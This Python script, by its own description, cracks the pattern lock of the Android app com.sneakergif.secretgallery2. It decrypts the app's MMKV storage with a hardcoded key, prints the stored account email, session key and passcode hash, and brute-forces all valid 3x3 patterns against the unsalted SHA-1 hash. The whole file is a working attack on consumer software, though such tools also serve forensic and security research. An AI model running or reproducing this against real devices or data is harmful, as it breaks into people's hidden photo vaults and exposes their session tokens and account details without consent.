import argparse
import base64
import hashlib
import json
import os

import mmkv

class UserInfo:
    def __init__(self, mail: str, creation_date: str, session_key: str, hashed_password: bytes):
        self.mail = mail
        self.creation_date = creation_date
        self.session_key = session_key
        self.hashed_password = hashed_password

    def __repr__(self):
        return f"<UserInfo mail={self.mail}, creation_date={self.creation_date}, session_key={self.session_key}, hashed_password={self.hashed_password}>"

class LockPatternCoordinate:
    def __init__(self, row, column):
        self._row = row
        self._column = column

    def getRow(self):
        return self._row

    def getColumn(self):
        return self._column

    def __repr__(self):
        coord_number_map = {
            (0, 0): 1,
            (0, 1): 2,
            (0, 2): 3,
            (1, 0): 4,
            (1, 1): 5,
            (1, 2): 6,
            (2, 0): 7,
            (2, 1): 8,
            (2, 2): 9,
        }

        return f"{coord_number_map[(self.getRow(), self.getColumn())]}"

class LockPattern:
    def __init__(self, path: list[LockPatternCoordinate] = None):
        self._path = path if path is not None else []

    def addPointToPath(self, point: LockPatternCoordinate):
        self._path.append(point)

    def getAsBytesArray(self):
        bytes_array = bytearray()
        for coordinate in self._path:
            bytes_array.append((coordinate.getRow() * 3) + coordinate.getColumn())
        return bytes_array

    def getAsSha1BytesArray(self):
        sha1 = hashlib.sha1()
        sha1.update(self.getAsBytesArray())
        return sha1.digest()

    def getAsBase64EncodedSha1Bytes(self):
        return base64.b64encode(self.getAsSha1BytesArray())

    def __repr__(self):
        return f'<LockPattern({" -> ".join(repr(point) for point in self._path)})>'

def _is_valid_move(current, next, visited):
    if next in visited:
        return False
    x1, y1 = divmod(current, 3)
    x2, y2 = divmod(next, 3)
    dx, dy = abs(x1 - x2), abs(y1 - y2)

    if dx == 2 and dy == 0:
        mid = (current + next) // 2
        if mid not in visited:
            return False
    if dx == 0 and dy == 2:
        mid = (current + next) // 2
        if mid not in visited:
            return False
    if dx == 2 and dy == 2:
        mid = (current + next) // 2
        if mid not in visited:
            return False
    return True

def _backtrack(visited, current, codes):
    codes.append(LockPattern([LockPatternCoordinate(num // 3, num % 3) for num in visited]))
    if len(visited) == 9:
        return
    for next in range(9):
        if _is_valid_move(current, next, visited):
            visited.append(next)
            _backtrack(visited, next, codes)
            visited.pop()

def generatePatternList():
    codes = []
    for start_num in range(9):
        _backtrack([start_num], start_num, codes)
    return codes

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Script to crack pattern lock of com.sneakergif.secretgallery2')
    parser.add_argument('-d', '--dir_storage', required=True, help='Storage directory containing secretgallery and secretgallery.crc')
    args = parser.parse_args()

    directory = args.dir_storage

    # Verify the directory
    if not os.path.isdir(directory):
        print(f"Error: {directory} is not a valid directory.")
        exit(-1)

    # Verify the files
    required_files = ['secretgallery', 'secretgallery.crc']
    files_in_directory = os.listdir(directory)

    for file in required_files:
        if file not in files_in_directory:
            print(f"Error: {directory} does not contain '{file}'.")
            exit(-1)

    # Ensure there are only two files
    if len(files_in_directory) != 2:
        print(f"Error: {directory} does not contain exactly two files.")
        exit(-1)

    mmkv.MMKV.initializeMMKV('storage')
    kv_storage = mmkv.MMKV("secretgallery", mmkv.MMKVMode.SingleProcess, cryptKey="3890dca21335H2VrCX")

    hashed_passcode_bytes = kv_storage.getBytes("passcode_lock_prefs_password_key")
    user_info_json = json.loads(kv_storage.getString("login_info"))

    user_info = UserInfo(user_info_json["account"], user_info_json["createDate"], user_info_json["sessionKey"], hashed_passcode_bytes)

    print("### User information ###")
    print(user_info)

    print("\n### Attacking pattern lock ###")
    print("Building lock pattern list for password attack...")
    patterns = generatePatternList()

    print("Trying to crack the lock pattern using the generated list...")
    for pattern in patterns:
        if user_info.hashed_password == pattern.getAsBase64EncodedSha1Bytes():
            print(f"\n### SUCCESS! ###")
            print(f"{pattern}")
            print("\nIt's interpreted like in this field:")
            print("[1]\t[2]\t[3]")
            print("[4]\t[5]\t[6]")
            print("[7]\t[8]\t[9]")
            exit(1)
    print("\n### BRUTEFORCE UNSUCCESSFUL! ###")
